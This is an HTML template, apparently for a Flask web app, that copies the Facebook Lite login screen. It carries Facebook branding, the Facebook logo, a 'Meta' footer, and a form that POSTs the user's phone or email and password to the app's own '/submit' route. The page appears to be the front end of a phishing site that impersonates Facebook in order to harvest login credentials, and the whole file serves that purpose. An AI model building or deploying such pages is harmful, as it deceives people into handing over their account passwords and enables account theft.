<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Facebook Lite Login</title>
  <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
</head>
<body>
  <div class="container">
    <div class="top-bar">
      <span class="back">←</span>
      <span class="language">English (US) ▼</span>
    </div>

    <div class="logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook logo" id="facebook-logo"
      style="width: 40px; height: 40px;" />
      
    </div>

    <form action="/submit" method="POST" class="login-form">
      <input type="text" name="phone" placeholder="Mobile number or email" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit" class="login-btn">Log in</button>
    </form>

    <p class="forgot">Forgot password?</p>

    <div class="create-account">
      <button type="button">Create new account</button>
    </div>

    <div class="meta">Meta</div>
  </div>
</body>
</html>
